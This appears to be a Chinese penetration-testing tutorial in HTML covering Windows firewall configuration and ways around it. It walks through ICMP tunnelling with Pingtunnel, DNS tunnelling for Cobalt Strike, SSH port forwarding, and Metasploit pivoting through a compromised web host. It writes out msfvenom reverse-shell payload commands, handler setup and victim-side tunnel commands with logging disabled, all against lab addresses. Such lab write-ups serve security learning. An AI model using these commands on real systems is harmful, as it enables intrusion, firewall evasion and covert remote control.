+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214551009.png&#34; alt=&#34;image-20240315214551009&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214620069.png&#34; alt=&#34;image-20240315214620069&#34;&gt;&lt;/p&gt;
+&lt;p&gt;规则开启时无法访问&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214721993.png&#34; alt=&#34;image-20240315214721993&#34;&gt;&lt;/p&gt;
+&lt;p&gt;规则关闭时则正常访问&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214830260.png&#34; alt=&#34;image-20240315214830260&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;命令行设置防火墙&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#命令行设置防火墙&#34;&gt;#&lt;/a&gt; 命令行设置防火墙&lt;/h4&gt;
+&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;netsh advfirewall show currentprofile #查看防火墙状态
+netsh advfirewall set allprofiles state on #开启防火墙
+netsh advfirewall set allprofiles state off #关闭防火墙
+netsh advfirewall firewall add rule name=&amp;quot;80off&amp;quot; dir=in action=block protocol=TCP localport=80 #禁止访问本地TCP协议80端口
+netsh advfirewall firewall add rule name=&amp;quot;80on&amp;quot; dir=in action=allow protocol=TCP localport=80 #允许访问本地TCP协议80
+netsh advfirewall firewall delete rule name=&amp;quot;80off&amp;quot; #删除名为80off的规则
+netsh advfirewall firewall show rule name=&amp;quot;http&amp;quot; #查看名为http的防火墙规则
+netsh advfirewall firewall add rule name=&amp;quot;22&amp;quot; dir=in protocol=tcp localport=22 action=block
+#阻止所有进入的 TCP 流量通过端口 22。
+netsh advfirewall firewall add rule name=&amp;quot;22on&amp;quot; dir=in protocol=tcp localport=22 action=allow
+#允许所有进入的 TCP 流量通过端口 22。
+https://learn.microsoft.com/zh-cn/windows/security/operating-system-security/network-security/windows-firewall/rules#官方文档
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;域组策略控制防火墙&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#域组策略控制防火墙&#34;&gt;#&lt;/a&gt; 域组策略控制防火墙&lt;/h4&gt;
+&lt;p&gt;在一个域环境中，域控制器（Domain Controller）可以通过组策略（Group Policy）来管理和同步其下属主机的防火墙规则。这样，管理员就可以集中地管理网络环境中所有计算机的防火墙设置，而不需要在每台计算机上单独进行配置。&lt;/p&gt;
+&lt;p&gt;管理员可以在域控制器上创建和配置组策略对象（Group Policy Object，GPO），然后将这些 GPO 应用到一个或多个组织单位（Organizational Unit，OU）上。这些 OU 中的计算机将会自动接收并应用这些 GPO 中的设置，包括防火墙规则。&lt;/p&gt;
+&lt;p&gt;在域控组策略新建 GPO&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316152809739.png&#34; alt=&#34;image-20240316152809739&#34;&gt;&lt;/p&gt;
+&lt;p&gt;右键编辑打开策略里的防火墙设置&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316153009887.png&#34; alt=&#34;image-20240316153009887&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在另一台域内主机防火墙是关闭的&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316153127674.png&#34; alt=&#34;image-20240316153127674&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在域控这里设置防火墙属性把域防火墙设置为启动&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316153220403.png&#34; alt=&#34;image-20240316153220403&#34;&gt;&lt;/p&gt;
+&lt;p&gt;右键点击强制会立刻启用该策略，或者使用 gpupdate/force 更新策略，或者主机重启后生效&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316153403952.png&#34; alt=&#34;image-20240316153403952&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这时域控下属主机防火墙开启并且不可自己关闭必须由管理员设置&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316155150999.png&#34; alt=&#34;image-20240316155150999&#34;&gt;&lt;/p&gt;
+&lt;p&gt;当然设置的防火墙规则也会同步下发到下属主机例如禁止 80 端口入站&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316155851138.png&#34; alt=&#34;image-20240316155851138&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;icmp隧道&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#icmp隧道&#34;&gt;#&lt;/a&gt; ICMP 隧道&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316173544717.png&#34; alt=&#34;image-20240316173544717&#34;&gt;&lt;/p&gt;
+&lt;p&gt;将 TCP 协议封装成 ICMP 协议&lt;/p&gt;
+&lt;p&gt;常见工具 Pingtunnel,icmpsh,spp&lt;/p&gt;
+&lt;h4 id=&#34;pingtunnel&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pingtunnel&#34;&gt;#&lt;/a&gt; Pingtunnel&lt;/h4&gt;
+&lt;p&gt;&lt;code&gt;https://github.com/esrrhs/pingtunnel&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;kali:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msfvenom &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; windows/x64/meterpreter/reverse_tcp &lt;span class=&#34;token assign-left variable&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4343&lt;/span&gt; &lt;span class=&#34;token assign-left variable&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;127.0&lt;/span&gt;.0.1 &lt;span class=&#34;token parameter variable&#34;&gt;-f&lt;/span&gt; exe &lt;span class=&#34;token parameter variable&#34;&gt;-o&lt;/span&gt; msf.exe &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;use exploit/multi/handler&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; payload windows/x64/meterpreter/reverse_tcp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; lhost &lt;span class=&#34;token number&#34;&gt;0.0&lt;/span&gt;.0.0&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; lport &lt;span class=&#34;token number&#34;&gt;9999&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;run&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;klai使用./pingtunnel &lt;span class=&#34;token parameter variable&#34;&gt;-type&lt;/span&gt; server 开启隧道&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;受害机:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pingtunnel.exe &lt;span class=&#34;token parameter variable&#34;&gt;-type&lt;/span&gt; client &lt;span class=&#34;token parameter variable&#34;&gt;-l&lt;/span&gt; :6666 &lt;span class=&#34;token parameter variable&#34;&gt;-s&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.10.130 &lt;span class=&#34;token parameter variable&#34;&gt;-t&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.10.130:8888 &lt;span class=&#34;token parameter variable&#34;&gt;-tcp&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-noprint&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-nolog&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;运行msf.exe&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;首先生成木马受害机运行后会将流量转发到 127.0.0.1 的 4343 也就是受害机的 4343 端口但是因为木马是 tcp 流量被限制了出不了站这时候用 &lt;code&gt;Pingtunnel&lt;/code&gt;  把 4343 端口的走 &lt;code&gt;tcp&lt;/code&gt;  的流量封装成 &lt;code&gt;icmp&lt;/code&gt;  协议的流量转到 kali 的 9999 端口，然后我们 kali 上面使用 &lt;code&gt;Pingtunnel&lt;/code&gt;  开启隧道，并监听 9999 端口这样我们就可以正常接收到流量绕过防火墙限制了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240325172437953.png&#34; alt=&#34;image-20240325172437953&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240325164605444.png&#34; alt=&#34;image-20240325164605444&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240325170434411.png&#34; alt=&#34;image-20240325170434411&#34;&gt;&lt;/p&gt;
+&lt;p&gt;CS 测试&lt;/p&gt;
+&lt;p&gt;首先建立两个监听&lt;/p&gt;
+&lt;p&gt;p1 为 10.10.10.130 端口 9898&lt;/p&gt;
+&lt;p&gt;p2 为 127.0.0.1 端口 6666&lt;/p&gt;
+&lt;p&gt;生成木马用 p2 生成，这样受害机器执行木马会将流量转发到本地的 6666 端口&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240328151229404.png&#34; alt=&#34;image-20240328151229404&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240328151611542.png&#34; alt=&#34;image-20240328151611542&#34;&gt;&lt;/p&gt;
+&lt;p&gt;受害机:&lt;br&gt;
+pingtunnel.exe -type client -l :6666 -s 192.168.0.145 -t 192.168.0.104:8888 -tcp 1 -noprint 1 -nolog 1&lt;/p&gt;
+&lt;p&gt;将 6666 端口流量封装成 icmp 转发到 kali 的 9898 端口&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240328152102020.png&#34; alt=&#34;image-20240328152102020&#34;&gt;&lt;/p&gt;
+&lt;p&gt;kali 启动隧道&lt;/p&gt;
+&lt;p&gt;./pingtunnel -type server&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240328152134631.png&#34; alt=&#34;image-20240328152134631&#34;&gt;&lt;/p&gt;
+&lt;p&gt;cs 成功上线&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240328151958141.png&#34; alt=&#34;image-20240328151958141&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;dns隧道搭建&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dns隧道搭建&#34;&gt;#&lt;/a&gt; DNS 隧道搭建&lt;/h3&gt;
+&lt;p&gt;准备一个域名&lt;/p&gt;
+&lt;p&gt;要添加两条记录分别是 A 记录和 NS 记录&lt;/p&gt;
+&lt;p&gt;A 记录指向我们的 vps 服务器&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1OU3MtcXQ5ZGo5bGhhNTI2YXIzM2FqeGFnNnMzc2F2M2VqODFpejY1Yy54eHgueHh4&#34;&gt;NS 记录指向刚才我们创建的 s.xxx.xxx&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1jc2RuczEtY3A3aTkzZDR3djhhMjU5NmFxb2M2NW4yNTRiN21tbm0xYi54eHgueHh4&#34;&gt;然后我们用 cs 上线时指向 dns1.xxx.xxx&lt;/span&gt;，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1zLTd6NmFtaXk2aTIzcWN0cW52MGQueHh4Lnh4eA==&#34;&gt;他就会解析到 s.xxx.xxx&lt;/span&gt;，接着 s.xxx.xxx 解析到我们的 vps 地址隧道搭建完成了就&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240426164655935.png&#34; alt=&#34;image-20240426164655935&#34;&gt;&lt;/p&gt;
+&lt;p&gt;**NS 记录，全称为 Name Server 记录，是用于指定域名应该由哪些 DNS 服务器进行解析的记录。** 它告诉互联网上的其他 DNS 服务器，当有查询请求到达时，应该将请求重定向到哪些 DNS 服务器上。&lt;/p&gt;
+&lt;p&gt;接着 cs 创建 DNS 监听&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1kbnMxLTR6OGY0OTBhaGQueHh4LnhuLS14eHhzLTIyMWcueHh4Lnh4eA==&#34;&gt;地址写 dns1.xxx.xxx 和 s.xxx.xxx&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;dns1 解析解析到 s. 接着再解析成 vps 地址&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240426165506171.png&#34; alt=&#34;image-20240426165506171&#34;&gt;&lt;/p&gt;
+&lt;p&gt;接着生成木马执行后内网主机即可上线&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240426170240575.png&#34; alt=&#34;image-20240426170240575&#34;&gt;&lt;/p&gt;
+&lt;p&gt;接着执行 mode dns-txt&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240426170944198.png&#34; alt=&#34;image-20240426170944198&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240426171142913.png&#34; alt=&#34;image-20240426171142913&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;ssh隧道搭建&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh隧道搭建&#34;&gt;#&lt;/a&gt; SSH 隧道搭建&lt;/h3&gt;
+&lt;p&gt;SSH 隧道（SSH Tunneling）是一种利用 SSH 协议为其他协议或网络连接提供安全加密的方法。它通过在 SSH 连接中创建加密通道，可以安全地传输未加密的网络流量，并将其转发到目标目的地，确保数据传输的私密性和安全性。SSH 隧道通常用于加密和保护从本地计算机到远程服务器的通信。&lt;/p&gt;
+&lt;p&gt;主要的 SSH 隧道类型包括：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;本地端口转发（Local Port Forwarding）：将本地计算机的指定端口的流量通过 SSH 连接转发到远程服务器，并由远程服务器将流量转发到目标服务器。这种方式使得本地计算机可以通过 SSH 连接安全地访问目标服务器提供的服务。&lt;/li&gt;
+&lt;li&gt;远程端口转发（Remote Port Forwarding）：将远程服务器上的指定端口的流量通过 SSH 连接转发到本地计算机，并由本地计算机将流量转发到目标服务器。这种方式允许远程服务器上的服务通过 SSH 连接安全地访问本地计算机上的服务。&lt;/li&gt;
+&lt;li&gt;动态端口转发（Dynamic Port Forwarding）：创建一个本地的 SOCKS 代理服务器，应用程序可以通过配置使用这个 SOCKS 代理，而 SSH 客户端则负责将流量通过 SSH 连接转发出去。这种方式可以用于将本地计算机的所有流量通过 SSH 连接转发到远程服务器，从而实现全局的网络流量加密和安全访问。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;网络环境为&lt;/p&gt;
+&lt;p&gt;vps 不可和内网主机访问&lt;/p&gt;
+&lt;p&gt;kali 与 web 可通信&lt;/p&gt;
+&lt;p&gt;web 内网主机 80 端口&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;远程端口转发 可用于入站被封&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;在kali运行:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;ssh&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-CfNg&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-R&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;9999&lt;/span&gt;:192.168.0.107:80 root@vpsIP&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;这条命令表示将web主机的80端口流量通过本机转发给我们vps的9999端口上&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-C：请求压缩所有数据&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-f：后台执行ssh指令&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-N：不执行远程指令&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-g：允许远程主机连接主机的转发端口&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240501173707184.png&#34; alt=&#34;image-20240501173707184&#34;&gt;&lt;/p&gt;
+&lt;p&gt;vps 即可访问 web 的网站&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240501173102203.png&#34; alt=&#34;image-20240501173102203&#34;&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;本地端口转发 可用于出站被封&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;ssh&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-CfNg&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-L&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8888&lt;/span&gt;:192.168.0.107:80 root@192.168.0.105&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;将web主机的80端口流量转到本机kali的8888端口上&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240501181131671.png&#34; alt=&#34;image-20240501181131671&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;代理实验&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代理实验&#34;&gt;#&lt;/a&gt; 代理实验&lt;/h3&gt;
+&lt;p&gt;网络环境为&lt;/p&gt;
+&lt;p&gt;win10 192.168.0.146 vm2&lt;br&gt;
+server4 192.168.0.145 10.10.10.134 vm2 vm19&lt;br&gt;
+web net 10.10.10.137 vm19  192.169.139.120 可出网&lt;br&gt;
+ vps 公网&lt;/p&gt;
+&lt;p&gt;拿到 web 主机后用他来当作跳板去渗透剩下两台主机，操作在 kali 通过 web 主机进行传输，因为 12server 是不出网的我们无法直接访问但是他是可以跟 web 主机通信的这样就可以在 web 主机上做代理把它当作跳板机和 12server 通信做渗透&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401211546933.png&#34; alt=&#34;image-20240401211546933&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;msf代理测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf代理测试&#34;&gt;#&lt;/a&gt; msf 代理测试&lt;/h4&gt;
+&lt;p&gt;首先生成木马获取 web 主机&lt;/p&gt;
+&lt;p&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=8888 LHOST=192.168.139.194 -f exe -o 555.exe&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240331172619806.png&#34; alt=&#34;image-20240331172619806&#34;&gt;&lt;/p&gt;
+&lt;p&gt;接着 msf 添加路由&lt;/p&gt;
+&lt;p&gt;run post/multi/manage/autoroute&lt;/p&gt;
+&lt;p&gt;run autoroute -p&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401211151335.png&#34; alt=&#34;image-20240401211151335&#34;&gt;&lt;/p&gt;
+&lt;p&gt;接着用到 &lt;code&gt;use auxiliary/server/socks_proxy&lt;/code&gt;  socks 代理模块开启 socks 代理&lt;/p&gt;
+&lt;p&gt;设置好配置运行&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401191609467.png&#34; alt=&#34;image-20240401191609467&#34;&gt;&lt;/p&gt;
+&lt;p&gt;此时我们用本地的主机访问 12server10 网段的的网站是访问不到的，下载 sockscap64 软件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401191937614.png&#34; alt=&#34;image-20240401191937614&#34;&gt;&lt;/p&gt;
+&lt;p&gt;配置好代理，地址是公网 kali 的 ip 和刚才 socks 代理模块开启的端口&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401192153184.png&#34; alt=&#34;image-20240401192153184&#34;&gt;&lt;/p&gt;
+&lt;p&gt;设置好可以通信后可以把代理添加到程序中&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401193150388.png&#34; alt=&#34;image-20240401193150388&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401192344752.png&#34; alt=&#34;image-20240401192344752&#34;&gt;&lt;/p&gt;
+&lt;p&gt;用代理打开浏览器后就可用访问内网 10.10.10.0 网段了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401193308682.png&#34; alt=&#34;image-20240401193308682&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在 kali 中只是 msf 可以跟 10 通信，要做到使用其他工具对 10 网段进行渗透可用用到 proxychains 代理&lt;/p&gt;
+&lt;p&gt;对 proxychains.conf 更改写入刚才 msf 代理模块设置的端口 ip，或者 proxychains4.conf&lt;/p&gt;
+&lt;p&gt;vim /etc/proxychains.conf&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401210033816.png&#34; alt=&#34;image-20240401210033816&#34;&gt;&lt;/p&gt;
+&lt;p&gt;设置好代理以后在要使用的工具前面加上 proxychains 命令例如 nmap 对 10.10.10.134 进行扫描，这样我们就可以在 kali 对 10 网段的内网渗透起来就会方便很多&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401210313313.png&#34; alt=&#34;image-20240401210313313&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;cs代理测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cs代理测试&#34;&gt;#&lt;/a&gt; cs 代理测试&lt;/h4&gt;
+&lt;p&gt;Proxifier 代理工具&lt;/p&gt;
+&lt;p&gt;cs 生成木马获取 web 主机权限&lt;/p&gt;
